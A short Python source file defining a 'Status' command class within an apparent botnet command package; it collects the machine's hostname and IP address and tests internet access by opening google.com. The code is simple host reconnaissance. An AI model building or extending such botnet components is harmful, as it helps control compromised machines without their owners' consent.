import time
import urllib.request
import socket
from botnet.commands.command_base import CommandBase

class Status(CommandBase):
    def __init__(self, command_type):
        self.command_type = command_type

    def execute(self):
        status = f"Command={self.command_type}, Hostname={self.hostname}, IP={self.ip}, Internet Access={self.internet_access}"
        self.timestamp = time.ctime(time.time())
        return status
    
    def get_metrics(self):
        return f"Status checked at {self.timestamp}"

    def get_hostname_ip(self):
        self.hostname = socket.gethostname()   
        self.ip = socket.gethostbyname(self.hostname)
        return self.hostname, self.ip
    
    def internet_reachability(self, host='http://google.com'):
        self.internet_access = False
        try:
            urllib.request.urlopen(host)
            self.internet_access = True
            return self.internet_access
        except:
            return self.internet_access
